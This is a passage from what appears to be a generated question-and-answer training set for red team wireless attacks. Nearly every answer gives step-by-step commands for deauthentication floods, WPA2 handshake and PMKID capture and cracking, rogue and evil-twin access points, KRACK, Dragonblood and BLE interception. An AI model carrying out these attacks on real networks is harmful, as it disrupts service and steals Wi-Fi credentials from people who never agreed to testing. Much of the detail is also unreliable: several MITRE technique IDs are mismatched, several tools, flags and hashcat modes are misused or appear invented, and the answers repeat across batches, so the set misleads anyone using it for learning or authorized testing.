sudo ip link set wlan1 down
sudo iwconfig wlan1 mode Managed
sudo ifconfig wlan1 up
```

**Step 2 — Set up the rogue AP:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dnsmasq
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

**Artifacts:**
- New AP with SSID "RogueWiFi" visible in the network list.
- Clients connecting to the rogue AP.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode Managed
sudo ifconfig wlan1 up
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
```
===PAIR===
Q: What are some RF-based attacks that can be used during wireless penetration testing?
A: **Technique: RF-Based Attacks — T1590.001**

**Step 1 — Jamming a specific channel:**
```bash
# Use aireplay-ng to jam the target channel
sudo aireplay-ng --channel=<target_channel> -0 1000 -a <BSSID> wlan0mon
```

**Step 2 — Replay attack on WEP:**
```bash
# Capture a WEP packet
sudo airodump-ng wlan0mon --encrypt wep

# Use aireplay-ng to replay the packet
sudo aireplay-ng --channel=<target_channel> -r <packet_number> wlan0mon
```

**Artifacts:**
- Interference on the target channel.
- Packet loss or retransmissions observed.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
# No additional cleanup needed for jamming, but ensure the network is stable after replay attacks.
```

=== BATCH 41 RETRY 0 ===
===PAIR===
Q: Can you perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture the handshake:**  
```bash
# Start capturing packets from the target BSSID and channel
sudo airodump-ng -c <channel> --bssid <BSSID> -w captured wlan0mon
```

**Step 3 \u2014 Deauthenticate a client to force re-authentication:**  
```bash
# Force a client to reconnect, capturing the handshake
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack the captured WPA2 handshake:**  
```bash
# Use John the Ripper or Hashcat to crack the password
john --format=wpapsk --wordlist=rockyou.txt captured-01.cap
# Or with Hashcat
hashcat -m 2500 captured-01.cap rockyou.txt
```

**Artifacts:**  
- Captured handshake file (`captured-01.cap`)
- Cracked password in logs

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm captured*
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack to gain access to the network?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
```

**Step 2 \u2014 Set up the attack:**  
```bash
# Use hcxtools to capture Dragonblood packets
sudo hcxdump -c <channel> --bssid <BSSID> -o dragonblood.hccapx wlan0mon
```

**Step 3 \u2014 Crack the captured Dragonblood packet:**  
```bash
# Use Hashcat to crack the password
hashcat -m 16800 dragonblood.hccapx rockyou.txt
```

**Artifacts:**  
- Captured Dragonblood packets (`dragonblood.hccapx`)
- Cracked password in logs

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood.*
```
===PAIR===
Q: What is a method to detect KRACK (Key Reinstallation Attacks) on a wireless network?
A: **Technique: Detecting KRACK \u2014 T1595.001**

**Step 1 \u2014 Set up monitoring:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Start capturing packets
tcpdump -i wlan0mon -w krack.pcapng
```

**Step 2 \u2014 Analyze the capture file:**  
```bash
# Use airodump-ng to check for retransmitted packets
sudo airodump-ng --deauth=0 krack.pcapng
```

**Artifacts:**  
- Captured packet file (`krack.pcapng`)
- Retransmitted packets indicating potential KRACK

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm krack.*
```
===PAIR===
Q: How can I use PMKID attacks to capture and crack WPA2 keys?
A: **Technique: PMKID Attack \u2014 T1590.001**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Use hcxtools to capture PMKIDs
sudo hcxdump -c <channel> --bssid <BSSID> -o pmkid.hccapx wlan0mon
```

**Step 3 \u2014 Crack the captured PMKID:**  
```bash
# Use Hashcat to crack the password
hashcat -m 16800 pmkid.hccapx rockyou.txt
```

**Artifacts:**  
- Captured PMKIDs (`pmkid.hccapx`)
- Cracked password in logs

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid.*
```
===PAIR===
Q: What is a method to perform WPA/WPA2 deauthentication attacks on a network?
A: **Technique: WPA/WPA2 Deauthentication Attack \u2014 T1595.001**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Identify the target network and clients:**  
```bash
# Discover target network and connected clients
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
```

**Step 3 \u2014 Perform deauthentication attacks on clients:**  
```bash
# Deauthenticate each client to force re-authentication
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Clients reconnecting and re-authenticating
- Potential disruption in network usage

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture credentials?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Configure and start the rogue AP:**  
```bash
# Install hostapd
sudo apt install hostapd

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start the rogue AP
sudo hostapd /tmp/hostapd.conf &
```

**Step 3 \u2014 Capture client credentials:**  
```bash
# Use airodump-ng to capture packets
sudo airodump-ng wlan0mon
```

**Artifacts:**  
- Clients connecting to the rogue AP
- Captured credentials (if using WPA/WPA2)

**Cleanup:**  
```bash
sudo killall hostapd
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```

=== BATCH 42 RETRY 0 ===
===PAIR===
Q: How can I capture WPA2 handshakes for offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w capture
```

**Artifacts:**  
- Captured files: `capture-<target_BSSID>.cap` and `capture-<target_BSSID>-01.kismet.csv`
- Network monitoring: Increased packet count on the target channel

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: What is a good method to detect rogue access points in a network?
A: **Technique: Wireless Network Reconnaissance \u2014 T1590.001**

**Step 1 \u2014 Scan for all wireless networks:**
```bash
sudo nmap -sn --script broadcast-list scan
```

**Step 2 \u2014 Compare with known networks:**
```bash
# Known networks list (SSID, BSSID)
cat known_networks.txt

# Check against known networks
diff <(sort known_networks.txt) <(sort nmap_output.txt | awk '{print $6, $8}')
```

**Artifacts:**  
- Nmap output file: `nmap_output.txt`
- Differences in SSID and BSSID between known and scanned networks

**Cleanup:**
```bash
rm nmap_output.txt
```

===PAIR===
Q: How can I perform a deauthentication attack on WPA/WPA2 clients?
A: **Technique: WPA/WPA2 Deauthentication Attack \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Identify target clients and BSSID:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel>
```

**Step 3 \u2014 Send deauthentication packets:**
```bash
sudo aireplay-ng -0 10 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**  
- Network monitoring: Clients disconnecting and reconnecting
- IDS alerts: Multiple deauthentication events

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: Explain how to set up a rogue access point that mimics an existing WPA2 network.
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Gather target network information:**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Configure hostapd for the rogue AP:**
```bash
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=<target_SSID>
hw_mode=g
channel=<target_channel>
wpa=2
wpa_passphrase=<rogue_password>
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
```

**Step 3 \u2014 Start the rogue AP:**
```bash
sudo hostapd /tmp/hostapd.conf &
```

**Artifacts:**  
- Wireless IDS: Multiple APs with same ESSID (BSSID mismatch)
- Network monitoring: Increased client associations to the rogue AP

**Cleanup:**
```bash
sudo killall hostapd
rm /tmp/hostapd.conf
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: How can I use KRACK to attack WPA2 connections?
A: **Technique: Key Reinstallation Attacks (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Put wireless adapter in monitor mode:**
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Start capturing packets on the target network:**
```bash
sudo airodump-ng wlan0mon --bssid <target_BSSID> --channel <target_channel> -w capture
```

**Step 3 \u2014 Send deauthentication packets to force reassociation:**
```bash
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Analyze captured packets for KRACK vulnerabilities:**
```bash
sudo aircrack-ng capture-<target_BSSID>.cap
```

**Artifacts:**  
- Captured files: `capture-<target_BSSID>.cap`
- Aircrack output: Possible rekeying or key reuse indications

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```

===PAIR===
Q: Describe a scenario where PMKID attacks would be particularly useful.
A: **Technique: PMKID Attacks \u2014 T1595.001**

**Scenario:**  
You are testing the security of a large office network with multiple WPA2-Enterprise access points and a centralized RADIUS server.

**Steps:**
1. **Reconnaissance:** Identify all APs and their BSSIDs.
   ```bash
   sudo airmon-ng start wlan0
   sudo airodump-ng wlan0mon --encrypt wpa2e
   ```

2. **Capture PMKID values:**  
   ```bash
   sudo aircrack-ng -J pmkid_output wlan0mon
   ```

3. **Crack the captured PMKIDs:**
   ```bash
   sudo john --wordlist=rockyou.txt --format=wpapmkid pmkid_output.john
   ```

**Artifacts:**  
- Captured files: `pmkid_output.john`
- Cracked passwords from the RADIUS server

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_output.*
```

These pairs cover different attack subtopics and include techniques such as WPA2 handshake capture, rogue access point setup, deauthentication attacks, KRACK, PMKID attacks, and wireless network reconnaissance.

=== BATCH 43 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake and perform an offline cracking attack?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture the handshake:**  
```bash
# Start capturing packets for the target BSSID and channel
sudo airodump-ng -c <channel> --bssid <target_BSSID> -w capture wlan0mon

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 1 -a <target_BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Crack the password:**  
```bash
# Use John the Ripper or Hashcat to crack the captured WPA2 PMKID/PSK
john --format=wpa capture-01.cap
# Or with Hashcat
hashcat -m 2500 capture-01.cap wordlist.txt
```

**Artifacts:**  
- Captured files: `capture-01.cap`
- Cracked password in logs or output of the cracking tool.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```

===PAIR===
Q: What is a KRACK attack, and how can I perform it on a WPA2 network?
A: **Technique: KRACK (Key Reinstallation Attacks) \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Perform the attack:**  
```bash
# Deauthenticate the client to force reassociation and reinstall keys
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon

# Capture packets during the attack
sudo airodump-ng wlan0mon --bssid <target_BSSID> -w krack_capture
```

**Step 3 \u2014 Verify the attack:**  
```bash
# Check if the keys were reinstalled more than once
tcpdump -r krack_capture-01.cap | grep "Key Reinstallation"
```

**Artifacts:**  
- Captured files: `krack_capture-01.cap`
- Logs indicating key reinstallations.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm krack_capture*
```

===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
```

**Step 2 \u2014 Set up the attack:**  
```bash
# Use hostapd-wpe to create an evil twin AP
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
wpa=3
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
dh_file=/etc/hostapd-wpe/dh.pem
EOF

# Start the evil twin AP
sudo hostapd-wpe /tmp/hostapd-wpe.conf
```

**Step 3 \u2014 Deauthenticate and capture:**  
```bash
# Force clients to reconnect to the evil twin
sudo aireplay-ng -0 5 -a <target_BSSID> -c <client_MAC> wlan0mon

# Capture packets during the attack
sudo airodump-ng wlan0mon --bssid <target_BSSID> -w dragonblood_capture
```

**Step 4 \u2014 Analyze and crack:**  
```bash
# Use Dragonblood to analyze the captured packets
dragonblood -i dragonblood_capture-01.cap

# Crack the password using a wordlist
john --format=wpa3 dragonblood_capture-01.cap
```

**Artifacts:**  
- Captured files: `dragonblood_capture-01.cap`
- Cracked password in logs or output of the cracking tool.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl stop hostapd-wpe
rm /tmp/hostapd-wpe.conf
```

===PAIR===
Q: How can I perform a Bluetooth Low Energy (BLE) scan and identify devices?
A: **Technique: BLE Scanning \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE devices:**  
```bash
# Use hcidump to capture BLE packets
sudo hcidump -a

# Or use bluetoothctl to scan and list devices
bluetoothctl power on
bluetoothctl scan on
```

**Step 2 \u2014 Identify specific devices:**  
```bash
# Filter the output to find known device names or MAC addresses
hcidump | grep <device_name_or_mac>
```

**Artifacts:**  
- Captured BLE packets in `hcidump` output.
- Device list from `bluetoothctl`.

**Cleanup:**  
```bash
bluetoothctl scan off
```

===PAIR===
Q: How can I perform a PMKID attack on a WPA2 network?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets for the target BSSID and channel
sudo airodump-ng -c <channel> --bssid <target_BSSID> -w pmkid_capture wlan0mon

# Use hcxpcapngtool to extract PMKIDs from the capture file
hcxpcapngtool -z pmkid.hccapx pmkid_capture-01.cap
```

**Step 3 \u2014 Crack the password:**  
```bash
# Use Hashcat to crack the captured PMKID
hashcat -m 16800 pmkid.hccapx wordlist.txt
```

**Artifacts:**  
- Captured files: `pmkid_capture-01.cap`, `pmkid.hccapx`
- Cracked password in logs or output of the cracking tool.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
rm pmkid.hccapx
```

===PAIR===
Q: How can I perform a wireless network reconnaissance and map the environment?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover all visible networks
sudo airodump-ng wlan0mon
```

**Step 2 \u2014 Map the environment:**  
```bash
# Use kismet or tcpdump to capture detailed information
kismet -c <channel> -bssid <target_BSSID>
```

**Artifacts:**  
- Captured files: `kismet.netxml`, `tcpdump` output.
- Network map generated from captured data.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
pkill kismet
```

=== BATCH 44 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake and perform an offline cracking attack?
A: **Technique: WPA2 Handshake Capture and Offline Cracking — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the handshake:**
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Crack the password:**
```bash
# Use a wordlist to crack the WPA2 key
aircrack-ng output-01.cap -w wordlist.txt
```

**Artifacts:**
- Captured handshake file (`output-01.cap`)
- Cracked password in `aircrack-ng` output

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: What is a common method to disrupt WPA/WPA2 connections?
A: **Technique: WPA/WPA2 Deauthentication Attacks — T1595.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa,wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Perform deauthentication:**
```bash
# Deauthenticate all clients to the target network
sudo aireplay-ng -0 100 -a <BSSID> wlan0mon
```

**Artifacts:**
- Disrupted connections on the target network.
- Clients may reconnect, but without successful authentication.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture client credentials?
A: **Technique: Rogue Access Point Setup — T1590.001**

**Step 1 — Configure the wireless interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Bring down the original interface
ifconfig wlan0 down
```

**Step 2 — Start the rogue access point:**
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /etc/hostapd/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd and dnsmasq
sudo systemctl start hostapd
sudo systemctl start dnsmasq
```

**Artifacts:**
- Clients connecting to "RogueWiFi" with the passphrase "roguepassword".
- Captured credentials in `/var/log/syslog` or `hostapd.conf`.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
ifconfig wlan0 up
sudo systemctl stop hostapd
sudo systemctl stop dnsmasq
rm /etc/hostapd/hostapd.conf
```
===PAIR===
Q: Explain the KRACK attack and how to perform it.
A: **Technique: Key Reinstallation Attacks (KRACK) — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture the handshake and perform KRACK attack:**
```bash
# Start capturing packets from the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon

# Use aireplay-ng to perform the KRACK attack
sudo aireplay-ng -R 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Artifacts:**
- Captured handshake file (`output-01.cap`)
- Potential reinstallation of keys, leading to data leakage.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: How can I perform a PMKID attack on a WPA2 network?
A: **Technique: PMKID Attack for WPA2 — T1590.001**

**Step 1 — Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 — Capture PMKID values:**
```bash
# Start capturing packets from the target network with PMKID filtering
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output --wps

# Deauthenticate a client to force a new handshake
sudo aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 — Crack the PMKID:**
```bash
# Use hashcat or john to crack the captured PMKIDs
hashcat -m 25420 output-01.cap wordlist.txt
```

**Artifacts:**
- Captured PMKID values in `output-01.cap`
- Cracked password in `hashcat` or `john` output

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm output*
```
===PAIR===
Q: Describe a scenario where Bluetooth Low Energy (BLE) attacks might be useful.
A: **Technique: BLE Attacks — T1546**

**Scenario:** An attacker is trying to gain access to a secure office area that uses BLE devices for proximity-based access control.

**Step 1 — Scan for BLE devices:**
```bash
# Install and use hcidump or blescan to find nearby BLE devices
sudo hciconfig hci0 up
blescan
```

**Step 2 — Identify the target device:**
- Look for a BLE device with a specific MAC address or name that corresponds to the access control system.

**Step 3 — Perform a man-in-the-middle attack:**
```bash
# Use bluez and blesnoop to intercept and modify BLE traffic
blesnoop hci0 <target_MAC>
```

**Artifacts:**
- Captured BLE packets from the target device.
- Potential modification of access control messages.

**Cleanup:**
```bash
sudo hciconfig hci0 down
```
These pairs cover various wireless attack techniques, including deauthentication, rogue APs, evil twins, and KRACK attacks, providing a comprehensive training set for red team operators.

